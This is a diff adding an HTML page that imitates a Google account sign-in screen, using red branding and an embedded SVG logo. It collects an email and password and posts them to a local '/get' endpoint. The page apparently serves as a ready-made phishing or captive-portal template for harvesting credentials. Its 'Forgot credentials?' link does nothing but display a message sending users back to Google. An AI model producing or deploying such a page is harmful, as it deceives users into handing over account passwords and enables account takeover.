@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #FFC72C;
+  margin-right: 100px
+}
+
+.brand-name {
+  font-size: 42px;
+  color: #D8102C;
+  margin-left: 10px;
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #D8102C;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #D8102C;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+  margin-top: 20px;
+}
+
+.submit-btn:hover {
+  background: #D8102C;
+}
+
+.forgot-password {
+  display: block;
+  text-align: center;
+  color: #000000;
+  text-decoration: underline;
+  margin-top: 10px;
+}
+
+.error-message {
+  color: red;
+  text-align: center;
+  display: none; 
+  margin-top: 10px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<?xml version="1.0" encoding="UTF-8"?>
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="120.000000pt" height="120.000000pt" viewBox="0 0 1200.000000 1200.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,1200.000000) scale(0.100000,-0.100000)"
+fill="#D8102C" stroke="none">
+<path d="M5615 11993 c-1528 -98 -2959 -775 -4002 -1892 -930 -996 -1489
+-2260 -1598 -3614 -20 -247 -20 -727 0 -974 149 -1842 1135 -3509 2680 -4528
+807 -533 1704 -852 2700 -960 205 -23 780 -31 1013 -16 1756 120 3352 990
+4410 2405 686 919 1085 1997 1172 3166 15 204 12 690 -5 906 -159 1961 -1257
+3705 -2960 4704 -77 45 -241 132 -365 194 -693 344 -1449 550 -2232 606 -131
+9 -685 11 -813 3z m-2030 -3543 c331 -86 586 -361 650 -701 13 -74 15 -168 13
+-686 l-3 -600 -30 -48 c-81 -131 -228 -168 -359 -91 -25 14 -57 42 -72 61 -53
+70 -54 82 -54 691 0 535 -1 565 -20 625 -50 158 -184 255 -350 253 -144 -1
+-259 -73 -322 -202 l-33 -67 -5 -600 c-5 -583 -6 -601 -26 -645 -29 -63 -100
+-125 -165 -144 -66 -20 -82 -20 -150 0 -70 21 -149 98 -168 164 -9 34 -11 195
+-9 670 l3 625 29 85 c55 166 126 280 242 391 136 129 286 206 471 239 78 14
+268 4 358 -20z m4530 6 c230 -50 414 -154 576 -324 134 -140 226 -303 276
+-489 24 -88 27 -115 27 -273 0 -158 -3 -185 -27 -273 -53 -199 -156 -374 -304
+-518 -204 -198 -441 -302 -719 -316 -315 -15 -601 95 -830 322 -190 187 -296
+408 -326 676 -14 131 -1 281 36 411 122 418 478 729 912 798 81 12 294 5 379
+-14z m-2146 -20 c110 -31 234 -87 319 -145 213 -145 279 -254 237 -397 -16
+-58 -21 -63 -512 -555 -409 -410 -494 -500 -491 -520 4 -30 29 -37 143 -38
+154 -2 274 42 398 144 89 73 136 95 212 95 143 0 254 -109 255 -249 0 -82 -18
+-128 -77 -191 -210 -227 -556 -354 -877 -321 -263 27 -477 126 -668 309 -209
+201 -323 454 -335 743 -7 160 6 264 48 394 58 181 148 324 291 461 125 119
+252 197 409 249 139 47 200 55 384 51 146 -3 183 -8 264 -30z m1677 -2677
+c120 -22 248 -86 341 -172 183 -168 79 -457 -164 -457 -77 0 -121 17 -187 74
+-28 23 -61 48 -73 54 -32 17 -110 15 -150 -5 -47 -22 -78 -88 -69 -147 14 -83
+67 -122 284 -210 62 -26 136 -58 165 -72 186 -95 311 -234 361 -404 26 -84 31
+-240 12 -330 -52 -242 -242 -450 -491 -537 -73 -25 -93 -27 -225 -28 -133 0
+-151 2 -225 28 -156 55 -299 160 -341 252 -28 58 -32 156 -10 209 20 49 81
+112 131 136 53 26 152 29 205 6 19 -8 55 -30 80 -49 75 -57 123 -77 186 -77
+95 0 162 48 184 131 32 118 -30 176 -305 282 -288 112 -444 257 -500 467 -38
+142 -26 319 30 447 63 141 187 268 330 339 138 69 284 90 431 63z m1573 -9
+c154 -37 308 -138 365 -240 27 -47 31 -65 31 -125 0 -58 -5 -79 -29 -123 -49
+-89 -124 -132 -228 -132 -76 0 -124 21 -192 79 -59 51 -82 61 -144 61 -86 0
+-142 -58 -142 -145 0 -94 51 -132 345 -255 150 -63 231 -114 315 -199 126
+-127 174 -253 173 -451 0 -96 -5 -128 -27 -196 -75 -232 -305 -440 -541 -489
+-235 -49 -487 20 -650 178 -63 62 -76 80 -90 130 -21 72 -14 133 23 201 80
+148 269 172 416 52 58 -48 105 -66 172 -66 110 0 184 72 184 179 0 89 -57 136
+-265 217 -163 63 -261 114 -333 172 -169 135 -239 295 -230 527 6 130 33 220
+97 319 47 72 154 179 221 221 153 96 350 128 529 85z m-5616 -24 c314 -93 540
+-332 624 -662 16 -62 18 -130 18 -689 l0 -620 -22 -41 c-72 -135 -227 -186
+-354 -118 -59 32 -113 95 -129 152 -6 23 -10 240 -10 589 0 370 -4 569 -11
+605 -31 144 -130 249 -269 284 -206 52 -410 -81 -450 -295 -6 -32 -10 -277
+-10 -610 0 -538 -1 -557 -21 -601 -43 -95 -131 -152 -234 -152 -106 0 -194 56
+-239 152 -21 44 -21 57 -21 655 0 599 0 612 22 698 81 315 317 565 616 652
+100 29 148 34 277 30 97 -2 144 -9 213 -29z m2291 8 c197 -38 399 -143 545
+-285 67 -65 93 -122 93 -201 0 -114 -2 -117 -537 -646 -267 -265 -485 -485
+-485 -489 0 -5 6 -17 13 -28 11 -15 32 -19 113 -22 167 -8 306 40 429 148 76
+67 131 91 205 91 157 0 271 -126 257 -283 -9 -98 -60 -165 -209 -274 -279
+-206 -664 -263 -1006 -149 -342 114 -618 412 -711 767 -69 266 -41 529 83 782
+221 446 709 683 1210 589z m4077 -1887 c67 -45 75 -139 18 -196 -81 -81 -220
+-26 -219 87 1 26 6 57 14 70 34 62 125 81 187 39z"/>
+<path d="M7742 7940 c-138 -36 -256 -120 -337 -240 -231 -341 -55 -800 346
+-901 267 -68 549 65 667 313 46 96 62 161 62 258 0 97 -16 162 -62 260 -49
+102 -148 206 -245 258 -131 69 -291 89 -431 52z"/>
+<path d="M5534 7941 c-218 -59 -380 -225 -430 -439 -31 -133 -4 -341 46 -350
+9 -1 175 158 385 368 317 317 368 372 359 387 -29 46 -242 66 -360 34z"/>
+<path d="M5523 5220 c-259 -68 -434 -295 -435 -565 -1 -132 26 -225 65 -225 7
+0 179 166 382 370 414 414 399 392 284 422 -85 22 -206 22 -296 -2z"/>
+<path d="M9853 3839 c-32 -17 -56 -74 -49 -114 10 -50 60 -89 105 -81 109 17
+109 187 1 201 -19 3 -45 0 -57 -6z"/>
+</g>
+</svg>
+
+
+
+
+
+
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in with your <font color="#4285F4">G</font><font color="#EA4335">o</font><font color="#FBBC05">o</font><font color="#4285F4">g</font><font color="#34A853">l</font><font color="#EA4335">e</font>
+ account</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+
+	  <a href="javascript:void(0);" class="forgot-password">Forgot credentials?</a>
+
+      <button class="submit-btn" type="submit">Continue</button>
+	<div class="error-message"></div>
+
+    </form>
+
+  </div>
+
+</div>
+<script>
+  document.querySelector('.forgot-password').addEventListener('click', function() {
+    var errorMessage = document.querySelector('.error-message');
+    errorMessage.innerHTML = "Please refer to your Google account if you forgot your credentials";
+    errorMessage.style.display = 'block';
+  });
+</script>
+</body>
+</html>
